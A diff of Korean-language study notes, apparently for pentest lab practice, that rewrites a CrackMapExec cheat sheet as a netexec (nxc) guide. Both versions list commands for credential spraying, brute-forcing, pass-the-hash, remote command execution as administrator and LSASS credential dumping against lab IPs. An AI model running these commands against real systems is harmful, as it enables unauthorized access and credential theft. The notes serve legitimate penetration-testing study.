@@ -1,107 +1,79 @@
-# crackmapexe
+# CrackMapExec → netexec (nxc)
 
-- SMB(445)를 중심으로 널 세션·인증 시도, 공유/사용자/RID/암호 정책 열거, Pass-the-Hash, 원격 명령 실행을 하나의 CLI로 처리하는 도구다.
-- 445가 열린 대상에서 익명 접근과 크리덴셜 스프레이를 빠르게 돌려 Pwned(+) 여부로 다음 행동을 정할 때 쓴다. 다만 버전 호환 이슈가 많아 세부 열거는 enum4linux·smbmap 위주로 보완한다.
-- 대상의 SMB(445/139) 포트가 필요하고, 인증은 -u/-p 계정, -H NTLM 해시, --local-auth(로컬 계정) 중 상황에 맞게 쓴다. apt로 설치하며 의존성(impacket-scripts, python3-impacket)까지 함께 upgrade해준다.
+- netexec(nxc) — CrackMapExec의 유지보수 후속 프로젝트. SMB·WinRM·MSSQL·LDAP·FTP 등 프로토콜별 모듈로 자격증명 검증·명령 실행·열거를 한 줄로 수행하는 스위스 아미 나이프. 명령어는 `nxc`, 구 문서의 `crackmapexec`/`cme`는 옵션 구조가 거의 같다.
+- 사용자명·패스워드·해시 목록을 확보했을 때 "이 크리덴셜이 어느 호스트에서 통하는지"를 대량 검증할 때, 그리고 통하는 호스트에서 곧바로 명령을 실행할 때.
+- Kali에 `apt install netexec` (또는 pip). 대상 호스트 목록과 크리덴셜 필요. SMB(445)가 닿는지가 기본 전제이며 로컬 관리자 권한이 있어야 명령 실행이 된다.
 
-## 💥 CrackMapExec SMB enumeration -> 애는 버전 호환 이슈 많음 -> enum4linux, smbmap 위주로 사용하기
-
-### 1\. ⚙️ 기본 사용법
+## 설치
 
 ```bash
-
-sudo apt install crackmapexec
-# 의존성 업데이트
-sudo apt upgrade crackmapexec impacket-scripts python3-impacket
-# 기본 문법 (프로토콜 지정 필수)
-crackmapexec smb <대상IP/CIDR/파일> [인증 옵션] [모듈/기능 옵션]
+sudo apt install netexec
+nxc --version
+# 구 명령어 습관이면 별칭을 만들어 둔다
+# alias cme='nxc'
 ```
 
------
-
-### 2\. 🔑 인증 옵션 (Credential Options)
-
-| 문법 | 설명 | OSCP 활용 |
-| :--- | :--- | :--- |
-| `crackmapexec smb 10.10.10.10` | 널 세션 (Null Session) 시도 (사용자/비밀번호 없이 익명 접근 시도). | 가장 먼저 시도하는 익명 열거 단계. |
-| `-u <user> -p <pass>` | 단일 사용자 이름과 비밀번호로 인증. | 확보한 유효한 자격 증명 사용. |
-| `-u <user> -P <pass.txt>` | 단일 사용자에 대해 비밀번호 목록 파일 대입 (Brute-force). | 특정 계정의 비밀번호 크래킹. |
-| `-U <user.txt> -p <pass>` | 사용자 목록 파일에 대해 단일 비밀번호 대입 (Credential Spraying). | 다수 계정에 쉬운 비밀번호 테스트. |
-| `-U <user.txt> -P <pass.txt>` | 사용자 목록과 비밀번호 목록을 조합하여 테스트. | 일반적인 무차별 대입 공격. |
-| `--local-auth` | 로컬 계정 인증 시도 (도메인이 아닌 로컬 계정). | 도메인 컨트롤러가 아닌 일반 서버 타겟 시. |
-| `-u <user> -H <NTLM해시>` | Pass-the-Hash (PtH) 공격. NTLM 해시만으로 인증. | 덤프된 NTLM 해시를 활용한 접속 시도. |
-
------
-
-### 3\. 🎯 핵심 열거 옵션 (Enumeration & Module Options)
-
-CME는 모듈(`-M`)이나 단축 옵션을 통해 다양한 정보를 수집합니다.
-
-| 옵션 | 설명 | 기능 |
-| :--- | :--- | :--- |
-| `--shares` | 대상 시스템의 모든 SMB 공유 폴더 목록과 접근 가능한 권한을 나열합니다. | `smbmap`의 기본 기능과 유사. 가장 필수적인 열거 옵션. |
-| `--users` | SMB를 통해 로컬 사용자 목록을 열거합니다. | 권한 상승 전 사용자 계정 정보 수집. |
-| `--rid-brute` | RID Brute-force 공격을 통해 유효한 사용자 이름과 그룹을 열거합니다. | 사용자 목록을 얻는 강력한 수단. |
-| `--pass-pol` | 암호 정책 (최소 길이, 복잡성 등)을 열거합니다. | Brute-force 공격 전략 수립에 활용. |
-| `-M <module>` | 내장된 모듈을 실행합니다. (예: `-M spider`로 파일 탐색, `-M sam`으로 SAM 덤프 시도) | 특정 작업을 수행하기 위한 확장 기능 사용. |
-
------
-
-### 4\. 📝 사용 예시 (Practical Examples)
-
-#### 예시 1: 서브넷 전체 Null Session 시도 및 공유 열거
+## 크리덴셜 검증 (가장 많이 쓰는 용도)
 
 ```bash
-# 10.10.10.0/24 서브넷 전체를 스캔하고, Null Session으로 접속 가능한 공유 목록을 확인
-crackmapexec smb 10.10.10.0/24 --shares
+nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs'
+# 서브넷 전체를 한 번에 검증
+nxc smb 10.10.10.0/24 -u fsmith -p 'Thestuffs'
+# 목파일 대입 — user.txt x pass.txt 전체 조합
+nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt
 ```
 
-#### 예시 2: 자격 증명 스프레이 (Credential Spraying)
+- 성공 판정: `STATUS_OK`가 아니라 `[+]` 마크가 뜬 줄. `[+] DOMAIN\user:pass` 형태로 유효한 조합만 표시된다.
+- `-f`로 호스트 파일 지정, `--port`로 445가 아닌 SMB 포트 지정이 가능하다.
+
+## 패스-the-해시
 
 ```bash
-# users.txt 파일의 모든 사용자에게 단일 비밀번호 'Winter2024!'를 대입하여 유효 계정 찾기
-crackmapexec smb 10.10.10.10 -U users.txt -p 'Winter2024!'
+nxc smb 10.10.10.161 -u administrator -H <NTLM해시>
+nxc smb 10.10.10.0/24 -u administrator -H <NTLM해시> --local-auth
 ```
 
-#### 예시 3: Pass-the-Hash (PtH) 공격
+- `-H`: NTLM 해시(NTHash 32자) 인증. `--local-auth`는 도메인 가입 여부와 무관하게 로컬 계정으로 인증한다.
+
+## 명령 실행
 
 ```bash
-# administrator 사용자의 NTLM 해시를 사용하여 인증 시도
-crackmapexec smb 10.10.10.10 -u administrator -H 'a9fdfa038c4b75ebc76dc855dd74f0da' --shares
+# -x: cmd 명령, --exec-method 옵션
+nxc smb 10.10.10.161 -u administrator -p 'Pass' -x "whoami"
+nxc smb 10.10.10.161 -u administrator -p 'Pass' -x "type C:\Users\administrator\Desktop\flag.txt"
 ```
 
-#### 예시 4: RID Brute-force를 이용한 사용자 열거
+- 명령 실행이 되려면 그 계정이 대상 호스트의 로컬 Administrators여야 한다. `[+]`는 나오지만 명령이 안 나오면 권한 부족이다.
+- SMB 기본 실행 방식은 wmiexec와 유사하다. 서비스 생성 방식이 필요하면 `--exec-method smbexec`를 붙인다.
+
+## 다른 프로토콜
 
 ```bash
-# 획득한 유효 자격 증명으로 접속 후, RID Brute-force 모듈 실행
-crackmapexec smb 10.10.10.10 -u user -p pass --rid-brute
+nxc winrm 10.10.10.161 -u fsmith -p 'Thestuffs' -x "hostname"
+nxc mssql 10.10.10.161 -u sa -p 'Pass' -x "whoami"
+nxc ldap 10.10.10.161 -u fsmith -p 'Thestuffs' -M windapsearch
+nxc ftp 10.10.10.161 -u anonymous -p ''
 ```
 
-#### 예시 5: 파일 목록 재귀적 확인 (Spider 모듈)
+- `winrm`은 5985, `mssql`은 1433 등 프로토콜마다 기본 포트가 다르다. 열거된 포트에 맞춰 모듈을 고른다.
+- `-M <모듈명>`: 열거용 모듈(예: `-M bloodhound`, `-M lsassy`로 LSASS 덤프 자격증명 수집).
+
+## 열거·수집 팁
 
 ```bash
-# 유효 자격 증명으로 접속 후, Spider 모듈을 사용하여 'Share' 공유 폴더 내부 파일 목록 확인
-crackmapexec smb 10.10.10.10 -u user -p pass -M spider -o SHARE=Share
+# 공유 열거
+nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --shares
+# 특정 공유 파일 나열/다운로드
+nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --share backups --dir
+# 패스워드 정책
+nxc smb 10.10.10.161 -u guest -p '' --pass-pol
+# 로컬 사용자 목록
+nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --users
 ```
 
------
+## 트러블슈팅
 
-### 5\. 💡 결과 해석 및 결합 활용 팁
-
-| 필드 | 의미 | 활용 팁 |
-| :--- | :--- | :--- |
-| P (Pwned) | 유효한 자격 증명으로 접속에 성공함 (`+` 표시). | 이 계정을 다른 서비스(SSH, RDP 등)에 재사용 시도 (Pass-the-Hash 가능성). |
-| Shares | 열거된 공유 폴더와 익명/인증된 사용자의 권한. | `READ/WRITE` 권한을 가진 공유를 찾아 셸 파일 업로드 경로로 활용. |
-| OS | 대상 시스템의 운영체제 정보. | 익스플로잇 선택 및 권한 상승 전략 수립에 중요. |
-| SID | Windows 시스템의 보안 식별자. | RID Brute-force의 시작점이나 도메인 정보 확인에 활용. |
-
-#### 결합 활용 팁
-
-```bash
-# Nmap 출력 파일에서 SMB 포트가 열린 IP만 추출하여 CME로 자격 증명 스프레이
-cat nmap_scan.gnmap | grep "445/open" | awk '{print $2}' > smb_targets.txt
-crackmapexec smb -f smb_targets.txt -U users.txt -p 'Fall2024$'
-
-# 유효한 크리덴셜(user:pass)을 얻은 후, CME를 사용하여 RDP 포트가 열려있는지 확인
-crackmapexec rdp 10.10.10.0/24 -u user -p pass
-```
+- STATUS_ACCESS_DENIED가 계속 나오면 계정이 로그인 권한이 없거나 SMB 서명·계정 정책 문제다. guest 계정으로 `--users`·`--pass-pol`은 익명 열거가 될 때도 있다.
+- 명령 실행이 안 되면 `[+]`와 실행 권한을 구분해야 한다. 로컬 관리자인지 netexec 자체가 `Pwn3d!`로 알려준다.
+- 호스트가 안 잡히면 445가 닫혀 있거나 방화벽이다. nxc는 포트 스캐너가 아니므로 nmap으로 먼저 확인한다.
+- 도구가 사라졌다는 메시지가 나오면 crackmapexec 대신 netexec 설치 여부를 확인한다. 같은 도구의 이름만 바뀐 버전이다.
